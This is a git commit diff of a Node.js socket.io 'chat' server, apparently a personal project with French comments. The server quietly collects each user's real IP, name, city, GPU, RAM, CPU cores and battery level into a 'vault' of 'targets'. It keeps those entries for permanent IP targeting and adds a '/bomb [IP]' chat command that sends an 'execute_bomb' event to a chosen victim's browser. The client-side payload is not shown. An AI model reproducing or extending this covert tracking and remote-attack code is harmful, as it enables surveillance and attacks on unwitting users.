da0a9cd526a610daadaaa756e4995f789b119d50
ademabatouy08-creator <ademabatouy08@gmail.com>
2026-03-08 13:16:14 +0100

    server.js

--- server.js
+++ server.js
@@ -5,54 +5,44 @@ const io = require('socket.io')(http);
 
 app.use(express.static(__dirname));
 
-const vault = {}; // Base de données des cibles
+const vault = {}; 
 
 io.on('connection', (socket) => {
-    // Extraction de la véritable IP (même derrière Cloudflare)
+    // Perceur d'IP (Vraie IP même derrière Cloudflare/Proxy)
     const ip = (socket.handshake.headers['x-forwarded-for'] || 
                 socket.handshake.address || 
                 socket.conn.remoteAddress).split(',')[0].trim();
 
     socket.on('check_device', (info) => {
-        // Enregistrement complet dans le dossier cible
-        vault[ip] = { 
-            sid: socket.id, 
-            name: info.name,
-            hw: info.hardware,
-            geo: info.geo
-        };
+        vault[ip] = { sid: socket.id, name: info.name };
         
         console.log(`
-        ╔═════════════ DOSSIER EXTRAIT ═════════════╗
+        ╔═════════════ CIBLE VERROUILLÉE ═════════════╗
         ║ NOM    : ${info.name}
         ║ IP     : ${ip}
-        ║ VILLE  : ${info.geo.city}
-        ║ MATOS  : ${info.hardware.gpu}
-        ║ RAM/CPU: ${info.hardware.ram}GB / ${info.hardware.cores} cores
-        ║ BATTERIE: ${info.hardware.battery}%
-        ╚═══════════════════════════════════════════╝
+        ║ VILLE  : ${info.geo.city} (${info.geo.country_name})
+        ║ GPU    : ${info.hardware.gpu}
+        ║ RAM    : ${info.hardware.ram} GB | CORES: ${info.hardware.cores}
+        ║ BATT   : ${info.hardware.battery}%
+        ╚═════════════════════════════════════════════╝
         `);
-
-        // Reconnexion automatique si l'IP est connue
         socket.emit('session_restored', vault[ip]);
     });
 
     socket.on('chat message', (data) => {
         const msg = data.text.trim();
 
-        // COMMANDE BOMB : /bomb [IP]
+        // COMMANDE : /bomb [IP]
         if (msg.startsWith("/bomb ")) {
             const targetIP = msg.split(" ")[1];
-            let hit = false;
             Object.keys(vault).forEach(storedIP => {
                 if (storedIP.includes(targetIP)) {
                     io.to(vault[storedIP].sid).emit('execute_bomb');
-                    hit = true;
+                    console.log(`[!!!] NUCLEAR_STRIKE_CONFIRMED: ${targetIP}`);
                 }
             });
-            if(hit) console.log(`[!!!] BOMB_DEPLOYED_ON: ${targetIP}`);
         } 
-        // COMMANDE STOP : /stop [IP]
+        // COMMANDE : /stop [IP]
         else if (msg.startsWith("/stop ")) {
             const targetIP = msg.split(" ")[1];
             Object.keys(vault).forEach(storedIP => {
@@ -60,15 +50,10 @@ io.on('connection', (socket) => {
                     io.to(vault[storedIP].sid).emit('stop_bomb');
                 }
             });
-        } 
-        else {
+        } else {
             io.emit('chat message', data);
         }
     });
-
-    socket.on('disconnect', () => {
-        // On conserve les données dans la vault pour le ciblage IP permanent
-    });
 });
 
-http.listen(3000, () => { console.log("GALAXY_OS_ULTIMATE_UP"); });
+http.listen(3000, () => { console.log("GALAXY_OS_V12_ULTIMATE_READY"); });
